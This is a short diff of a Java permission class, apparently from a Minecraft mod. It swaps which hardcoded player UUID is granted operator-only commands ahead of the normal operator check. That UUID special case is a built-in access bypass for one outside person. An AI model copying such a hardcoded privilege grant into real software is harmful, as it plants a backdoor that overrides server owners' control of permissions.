@@ -2,6 +2,7 @@ package com.unrealdinnerbone.yarm.Commands;
 
 import com.unrealdinnerbone.yarm.Util.CoolPeople;
 import com.unrealdinnerbone.yarm.Util.OpChecker;
+import com.unrealdinnerbone.yarm.Util.UUIDHelper;
 import net.minecraft.command.ICommandSender;
 import net.minecraft.entity.player.EntityPlayerMP;
 import net.minecraft.server.MinecraftServer;
@@ -11,7 +12,7 @@ public abstract class YarmCommandUnRealOPOnly extends YarmCommandBase
     @Override
     public boolean checkPermission(MinecraftServer server, ICommandSender sender){
         if(sender instanceof EntityPlayerMP){
-            if(((EntityPlayerMP) sender).getUniqueID().equals(CoolPeople.UnRealDinnerbone_UUID)){
+            if(((EntityPlayerMP) sender).getUniqueID().equals(UUIDHelper.Manmaed)){
                 return true;
             }
             return OpChecker.isPlayerOpped(((EntityPlayerMP) sender).getGameProfile());
